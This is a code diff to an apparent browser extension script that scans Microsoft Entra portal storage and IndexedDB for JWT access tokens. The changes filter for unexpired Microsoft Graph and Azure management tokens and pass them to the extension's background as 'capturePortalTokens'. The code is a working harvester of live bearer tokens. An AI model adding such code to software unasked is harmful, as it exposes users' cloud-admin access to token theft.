@@ -9,6 +9,7 @@
   const MAX_INDEXED_DB_RECORDS_PER_STORE = 100;
   let attempts = 0;
   let isScanning = false;
+  let lastTokenFingerprint = "";
 
   async function scan() {
     if (isScanning) {
@@ -17,17 +18,22 @@
     isScanning = true;
     attempts += 1;
     try {
-      const includeIndexedDb = attempts <= 3 || attempts % 5 === 0;
+      const includeIndexedDb = window === window.top && (attempts <= 3 || attempts % 5 === 0);
       const tokens = await collectPortalTokens(includeIndexedDb);
-      if (tokens.length) {
+      const fingerprint = tokens.slice().sort().join("|");
+      if (tokens.length && fingerprint !== lastTokenFingerprint) {
+        lastTokenFingerprint = fingerprint;
         chrome.runtime.sendMessage(
           {
             action: "capturePortalTokens",
             tokens,
             source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
           },
-          () => {
+          (response) => {
             void chrome.runtime.lastError;
+            if (response && response.success && response.data && response.data.captured && response.data.captured.length) {
+              clearInterval(interval);
+            }
           }
         );
       }
@@ -104,13 +110,22 @@
 
   function openDatabase(databaseName) {
     return new Promise((resolve) => {
+      let settled = false;
+      function finish(value) {
+        if (settled) {
+          if (value && typeof value.close === "function") value.close();
+          return;
+        }
+        settled = true;
+        resolve(value);
+      }
       try {
         const request = window.indexedDB.open(databaseName);
-        request.onerror = () => resolve(undefined);
-        request.onblocked = () => resolve(undefined);
-        request.onsuccess = () => resolve(request.result);
+        request.onerror = () => finish(undefined);
+        request.onblocked = () => finish(undefined);
+        request.onsuccess = () => finish(request.result);
       } catch {
-        resolve(undefined);
+        finish(undefined);
       }
     });
   }
@@ -197,7 +212,7 @@
       return;
     }
     for (const match of value.matchAll(JWT_PATTERN)) {
-      tokens.add(match[0]);
+      if (isSupportedApiToken(match[0])) tokens.add(match[0]);
       if (tokens.size >= MAX_TOKENS) {
         return;
       }
@@ -205,6 +220,26 @@
     const parsed = parseJson(value);
     if (parsed !== undefined) {
       addTokensFromValue(parsed, tokens, 1);
+    }
+  }
+
+  function isSupportedApiToken(token) {
+    try {
+      const payload = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
+      const decoded = JSON.parse(atob(payload.padEnd(Math.ceil(payload.length / 4) * 4, "=")));
+      const audiences = Array.isArray(decoded.aud) ? decoded.aud : [decoded.aud];
+      const allowedAudiences = new Set([
+        "https://graph.microsoft.com",
+        "https://graph.microsoft.com/",
+        "00000003-0000-0000-c000-000000000000",
+        "https://management.azure.com",
+        "https://management.azure.com/",
+        "https://management.core.windows.net/",
+        "797f4846-ba00-4fd7-ba43-dac1f8f63013"
+      ]);
+      return Number(decoded.exp) * 1000 > Date.now() && audiences.some((audience) => allowedAudiences.has(audience));
+    } catch {
+      return false;
     }
   }
 
